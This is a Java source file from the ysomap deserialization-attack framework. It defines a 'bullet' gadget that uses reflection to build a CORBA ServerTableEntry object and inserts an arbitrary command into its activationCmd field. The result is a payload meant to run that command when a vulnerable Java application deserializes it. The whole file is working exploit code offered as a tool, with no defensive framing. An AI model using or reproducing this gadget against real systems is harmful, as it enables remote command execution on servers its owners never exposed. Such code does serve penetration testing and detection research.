package ysomap.core.bullet.jdk;

import com.sun.corba.se.impl.activation.ServerTableEntry;
import com.sun.corba.se.impl.logging.ActivationSystemException;
import com.sun.corba.se.spi.activation.RepositoryPackage.ServerDef;
import ysomap.common.annotation.Bullets;
import ysomap.common.annotation.NotNull;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;
import ysomap.core.util.ReflectionHelper;

/**
 * @author wh1t3P1g
 * @since 2021/3/11
 */
@Bullets
public class ServerTableEntryBullet extends Bullet<ServerTableEntry> {

    @NotNull
    @Require(name = "cmd", detail = "command")
    public String cmd;

    @Override
    public ServerTableEntry getObject() throws Exception {
        Object entry = ReflectionHelper.newInstance(
                "com.sun.corba.se.impl.activation.ServerTableEntry",
                new Class[]{ActivationSystemException.class, int.class, ServerDef.class, int.class, String.class, boolean.class, boolean.class},
                new Object[]{null,1,new ServerDef("","","","",""),1,"",true,false});
        ReflectionHelper.setFieldValue(entry, "activationCmd", cmd);
        return (ServerTableEntry) entry;
    }
}
